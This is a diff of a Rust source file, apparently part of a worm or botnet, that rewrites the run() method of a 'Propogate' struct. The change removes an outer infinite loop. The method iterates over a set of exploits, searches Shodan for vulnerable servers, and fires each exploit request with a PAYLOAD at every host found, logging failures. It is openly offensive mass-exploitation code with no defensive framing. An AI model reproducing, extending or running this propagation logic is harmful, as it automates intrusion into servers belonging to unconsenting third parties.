@@ -35,25 +35,23 @@ impl Propogate {
     }
 
     pub fn run(&mut self) {
-        loop {
-            for exploit in self.exploits.iter() {
-                let mut page = 0;
+        for exploit in self.exploits.iter() {
+            let mut page = 0;
 
-                info!("searching for vulnerable {} servers", exploit.query);
+            info!("searching for vulnerable {} servers", exploit.query);
 
-                while let Some(search) = self.shodan.search(&exploit.query, page) {
-                    info!("shodan searching {} hosts, page {}/{}", search.total, page, search.total / 100);
+            while let Some(search) = self.shodan.search(&exploit.query, page) {
+                info!("shodan searching {} hosts, page {}/{}", search.total, page, search.total / 100);
 
-                    for host in search.hosts {
-                        let ip = Ipv4Addr::from_bits(host.ip);
+                for host in search.hosts {
+                    let ip = Ipv4Addr::from_bits(host.ip);
 
-                        if let Err(err) = http::send(ip, (exploit.request)(ip.to_string(), PAYLOAD)) {
-                            warn!("failed to send exploit to {}, {}", ip, err);
-                        }
+                    if let Err(err) = http::send(ip, (exploit.request)(ip.to_string(), PAYLOAD)) {
+                        warn!("failed to send exploit to {}, {}", ip, err);
                     }
-
-                    page += 1;
                 }
+
+                page += 1;
             }
         }
     }
